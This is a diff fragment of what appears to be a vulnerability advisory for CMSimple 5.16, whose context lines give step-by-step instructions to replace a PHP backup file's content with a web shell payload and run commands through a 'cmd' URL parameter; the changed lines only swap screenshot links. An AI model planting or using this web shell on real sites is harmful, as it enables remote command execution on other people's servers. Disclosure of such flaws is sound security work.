@@ -19,7 +19,7 @@ Functionality of downloading php backup files in CMSimple 5.16 allows a user wit
 5) In code editor delete PHP-code to access file directly and put your payload: `<?php system($_GET['cmd']);?>`
 6) Save file.
 7) Now you can execute commands via cmd parameter: `/content/content.php?cmd=id`
-![cmsimple_logedit1](https://github.com/user-attachments/assets/a4eec27d-ab1b-4682-8723-46c7d6143605)
-![cmsimple_logedit2](https://github.com/user-attachments/assets/def015d9-dbfd-45ee-96a8-9b50c4b392fb)
-![cmsimple_logedit3](https://github.com/user-attachments/assets/63f8f128-5617-4dfa-97ce-cf9986d91ea2)
-![cmsimple_logedit4](https://github.com/user-attachments/assets/1e473950-f50b-4f7d-b623-f922d470e517)
+![cmsimpl_backup_rce1](https://github.com/user-attachments/assets/b239704d-e2be-4ca7-a5a5-b9551236ff6c)
+![cmsimpl_backup_rce2](https://github.com/user-attachments/assets/62a45dfd-e796-4427-991f-abded87cf7f6)
+![cmsimpl_backup_rce3](https://github.com/user-attachments/assets/eae8df71-8538-4f8d-a805-def91e9ddbc2)
+![cmsimpl_backup_rce4](https://github.com/user-attachments/assets/b6cb759c-5e51-4c68-a148-a51133fd1159)
